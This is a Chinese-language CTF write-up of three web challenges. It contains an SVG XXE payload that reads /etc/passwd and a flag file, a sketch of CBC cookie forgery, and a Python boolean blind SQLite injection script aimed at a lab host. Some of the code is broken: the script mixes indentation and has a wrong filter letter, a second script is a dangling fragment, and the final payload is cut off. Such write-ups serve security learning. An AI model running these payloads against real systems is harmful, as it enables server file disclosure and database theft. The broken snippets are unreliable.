2.SVGMagic

标签:文件上传，xxe，svg

参考题解

svg实际上是一种xml文档，所以这里应该可以xxe

又根据svg的<text>标签可以成功执行xxe。

svg之text标签

0x01.payload

用下面的payload，上传文件内容如下

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<svg width="512px" height="190px" viewBox="0 0 512 190" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid">
    <g>
		<text x="0" y="15" fill="red">&xxe;</text>
	</g>
</svg>

上面的是我们的xxe的payload，下面是名为m4xlmum.svg的文件的内容。

重点：不知道flag在哪里
自己试了半天也没事出来，看看大师傅的知道了flag.txt文件在程序根目录下，就是file:///proc/self/cwd/flag.txt,

记录一下，当前进程的根目录即为`/proc/self/cwd/`

最终payload

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///proc/self/cwd/flag.txt" >]>

<svg width="512px" height="190px" viewBox="0 0 512 190" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid">

3.Mixer

标签:分段密码攻击，cookie伪造

这个是涉及密码学的题目，真有意思了

这里要将自己的身份is_admin置为1，这里涉及到了CBC分组加密的知识，下面这个链接里面又讲分组加密及对应的攻击方式

BP抓包，改一下user字段的cookie为下图所示，两次修改不同位置（可最先两个与最后两个）的数据可获得加密前的数据的格式为

4.Sequel

标签:sqlite注入

参考链接

似乎到目前为止还没有搞过sqlite的注入，下面顺便学习一下。

爆破得用户名密码

无法注入可爆破
用户名:guest，密码:guest
登陆后是以下的页面

啥提示都没得，抓下包或者直接看下请求包里面的cookie的值，有个带eyj的1337_AUTH=eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9
后面的内容base64解码后为

{"username":"guest","password":"guest"}

看到是我们的用户名与密码，然后尝试注入，首先用下面的payload
{"username":"\" OR 1 OR \"","password":"guest"}

eyJ1c2VybmFtZSI6IlwiIE9SIDEgT1IgXCIiLCJwYXNzd29yZCI6Imd1ZXN0In0=

上面的sql语句成功回显内容
而如果将上面的1改为0，就不行了，会显示非法用户，根据这个，可以进行布尔盲注。
下面都是python3脚本，这里的表名用EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \"{}\" limit 1)注。
import requests
import base64
import string
import sys

out = ""

while True:
    for letter in string.printable:
        tmp = out + letter

        if letter == 'n': continue    #过滤掉notes表
		if letter == 'r': continue    #过滤掉reviews表
		if letter == 'n': continue    #过滤掉sqlite表

        payload = r'{{"username":"\" OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \"{}\" limit 1) OR \"","password":"guest"}}'.format(
            tmp + '%')

        payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

        r = requests.get('http://61072f69-98c4-4f55-8b17-69dad567971b.node3.buuoj.cn/sequels',
                         cookies={"1337_AUTH": payload})
        if "Movie" in r.text:
            out = tmp
            sys.stdout.write(letter)
            sys.stdout.flush()
            break

因为不止有一个表，所以要来回试试，最后的结果就是有一个userinfo表

import requests
import base64
import string
import sys

out = ""

while True:
    for letter in string.printable:
        tmp = out + letter

            tmp + '%')
